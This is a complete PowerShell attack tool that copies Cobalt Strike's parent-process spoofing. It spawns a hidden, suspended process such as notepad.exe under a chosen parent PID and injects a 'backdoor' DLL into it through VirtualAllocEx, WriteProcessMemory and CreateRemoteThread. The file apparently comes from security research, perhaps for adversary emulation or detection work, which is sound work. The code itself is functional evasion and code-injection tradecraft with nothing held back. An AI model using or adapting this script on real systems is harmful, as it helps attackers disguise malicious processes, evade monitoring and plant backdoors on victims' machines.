function PPID-Spoof{
<#

.SYNOPSIS
  Ppid-Spoof-Process-Masquerade is used to replicate how Cobalt Strike does ppid spoofing and masquerade a spawned process.

  Author: In Ming Loh
  Email: inming.loh@countercept.com

.PARAMETER ppid
  Parent process PID

.PARAMETER spawnTo
  Path to the process you want your payload to masquerade as.

.PARAMETER dllPath
  Dll for the backdoor.
  If powershell is running on 64-bits mode, dll has to be 64-bits dll. The same for 32-bits mode.

.EXAMPLE
  PS> PPID-Spoof -ppid 1234 -spawnto "C:\Windows\System32\notepad.exe" -dllpath messagebox.dll
#>

  [CmdletBinding()]
  param (
    [Parameter(Mandatory = $True)]
    [int]$ppid, 
    [Parameter(Mandatory = $True)]
    [string]$spawnTo, 
    [Parameter(Mandatory = $True)]
    [string]$dllPath
  )

  # Native API Definitions
  Add-Type -TypeDefinition @"
  using System;
  using System.Runtime.InteropServices;

  [StructLayout(LayoutKind.Sequential)]
  public struct PROCESS_INFORMATION 
  {
     public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
  }

  [StructLayout(LayoutKind.Sequential,  CharSet = CharSet.Unicode)]
  public struct STARTUPINFOEX
  {
       public STARTUPINFO StartupInfo; public IntPtr lpAttributeList;
  }

  [StructLayout(LayoutKind.Sequential)]
  public struct SECURITY_ATTRIBUTES
  {
      public int nLength; public IntPtr lpSecurityDescriptor; public int bInheritHandle;
  }

  [StructLayout(LayoutKind.Sequential,  CharSet = CharSet.Unicode)]
  public struct STARTUPINFO
  {
      public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
  }

  [Flags]
  public enum AllocationType
  {
       Commit = 0x1000,  Reserve = 0x2000,  Decommit = 0x4000,  Release = 0x8000,  Reset = 0x80000,  Physical = 0x400000,  TopDown = 0x100000,  WriteWatch = 0x200000,  LargePages = 0x20000000
  }

  [Flags]
  public enum MemoryProtection
  {
       Execute = 0x10,  ExecuteRead = 0x20,  ExecuteReadWrite = 0x40,  ExecuteWriteCopy = 0x80,  NoAccess = 0x01,  ReadOnly = 0x02,  ReadWrite = 0x04,  WriteCopy = 0x08,  GuardModifierflag = 0x100,  NoCacheModifierflag = 0x200,  WriteCombineModifierflag = 0x400
  }

  public static class Kernel32{
    [DllImport("kernel32.dll",  SetLastError = true)]
    public static extern IntPtr OpenProcess(
     UInt32 processAccess, 
     bool bInheritHandle, 
     int processId);

    [DllImport("kernel32.dll",  SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool InitializeProcThreadAttributeList(
         IntPtr lpAttributeList, 
         int dwAttributeCount, 
         int dwFlags, 
         ref IntPtr lpSize);

    [DllImport("kernel32.dll",  SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UpdateProcThreadAttribute(
         IntPtr lpAttributeList, 
         uint dwFlags, 
         IntPtr Attribute, 
         IntPtr lpValue, 
         IntPtr cbSize, 
         IntPtr lpPreviousValue, 
         IntPtr lpReturnSize);

    [DllImport("kernel32.dll",  SetLastError = true)]
    public static extern IntPtr GetProcessHeap();

    [DllImport("kernel32.dll",  SetLastError=false)]
    public static extern IntPtr HeapAlloc(IntPtr hHeap,  uint dwFlags,  UIntPtr dwBytes);

    [DllImport("kernel32.dll",  SetLastError=true)]
    public static extern bool CreateProcess(
       string lpApplicationName, 
       string lpCommandLine, 
       ref SECURITY_ATTRIBUTES lpProcessAttributes,  
       ref SECURITY_ATTRIBUTES lpThreadAttributes, 
       bool bInheritHandles,  
       uint dwCreationFlags, 
       IntPtr lpEnvironment, 
       string lpCurrentDirectory, 
       [In] ref STARTUPINFOEX lpStartupInfo,  
       out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll",  SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hHandle);

    [DllImport("kernel32.dll",  SetLastError=true,  ExactSpelling=true)]
    public static extern IntPtr VirtualAllocEx(
      IntPtr hProcess,  
      IntPtr lpAddress, 
      Int32 dwSize,  
      AllocationType flAllocationType,  
      MemoryProtection flProtect);

    [DllImport("kernel32.dll",  SetLastError = true)]
    public static extern bool WriteProcessMemory(
      IntPtr hProcess,  
      IntPtr lpBaseAddress, 
      byte[] lpBuffer,  
      Int32 nSize,  
      out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(
      IntPtr hProcess,  
      IntPtr lpAddress, 
      Int32 dwSize,  
      uint flNewProtect,  
      out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(
      IntPtr hProcess, 
      IntPtr lpThreadAttributes,  
      uint dwStackSize,  
      IntPtr lpStartAddress,  
      IntPtr lpParameter,  
      uint dwCreationFlags,  
      IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern bool ProcessIdToSessionId(uint dwProcessId,  out uint pSessionId);

    [DllImport("kernel32.dll")]
    public static extern uint GetCurrentProcessId();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(
      IntPtr hModule,
      string procName);

    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(
      string lpModuleName);
  }
"@

  # Check if the pid specified is within the same session id as the current process.
  $processSessionId = 0
  $parentSessionId = 0
  $currentPid = [Kernel32]::GetCurrentProcessId()
  $result1 = [Kernel32]::ProcessIdToSessionId($currentPid, [ref]$processSessionId)
  $result2 = [Kernel32]::ProcessIdToSessionId($ppid, [ref]$parentSessionId)

  if(!$result1 -or !$result2){
    Write-Host "kernel32!ProcessIdToSessionId function failed!"
    break
  }
  if($processSessionId -ne $parentSessionId){
    Write-Host "Different session id for processes! Try process that's within the same session instead."
    break
  }

  # Prepare all the argument needed.
  $sInfo = New-Object StartupInfo
  $sInfoEx = New-Object STARTUPINFOEX
  $pInfo = New-Object PROCESS_INFORMATION
  $SecAttr = New-Object SECURITY_ATTRIBUTES
  $SecAttr.nLength = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)
  $sInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($sInfoEx)
  $lpSize = [IntPtr]::Zero
  $sInfoEx.StartupInfo = $sInfo
  $hSpoofParent = [Kernel32]::OpenProcess(0x1fffff, 0, $ppid)
  $lpValue = [IntPtr]::Zero
  $lpValue = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
  [System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, $hSpoofParent)
  $GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName

  # ppid spoofing and process spoofing happening now.
  $result1 = [Kernel32]::InitializeProcThreadAttributeList([IntPtr]::Zero, 1, 0, [ref]$lpSize)
  $sInfoEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
  $result1 = [Kernel32]::InitializeProcThreadAttributeList($sInfoEx.lpAttributeList, 1, 0, [ref]$lpSize)
  $result1 = [Kernel32]::UpdateProcThreadAttribute($sInfoEx.lpAttributeList, 
                                                    0, 
                                                    0x00020000,  # PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
                                                    $lpValue, 
                                                    [IntPtr]::Size, 
                                                    [IntPtr]::Zero, 
                                                    [IntPtr]::Zero) 
  $result1 = [Kernel32]::CreateProcess($spawnTo, 
                                        [IntPtr]::Zero, 
                                        [ref]$SecAttr, 
                                        [ref]$SecAttr, 
                                        0,
                                        0x08080004, #EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED
                                        # 0x00080010, # EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE (This will show the window of the process)
                                        [IntPtr]::Zero, 
                                        $GetCurrentPath, 
                                        [ref] $sInfoEx, 
                                        [ref] $pInfo)

  if($result1){
    Write-Host "Process $spawnTo is spawned with pid "$pInfo.dwProcessId  
  }else{
    Write-Host "Failed to spawn process $spawnTo"
    break
  }
  
  $dllPath = (Resolve-Path $dllPath).ToString()

  # Load and execute dll into spoofed process.
  $loadLibAddress = [Kernel32]::GetProcAddress([Kernel32]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
  $lpBaseAddress = [Kernel32]::VirtualAllocEx($pInfo.hProcess, 0, $dllPath.Length, 0x00003000, 0x4)
  $result1 = [Kernel32]::WriteProcessMemory($pInfo.hProcess, $lpBaseAddress, (New-Object "System.Text.ASCIIEncoding").GetBytes($dllPath), $dllPath.Length, [ref]0)
  $result1 = [Kernel32]::CreateRemoteThread($pInfo.hProcess, 0, 0, $loadLibAddress, $lpBaseAddress, 0, 0)
}
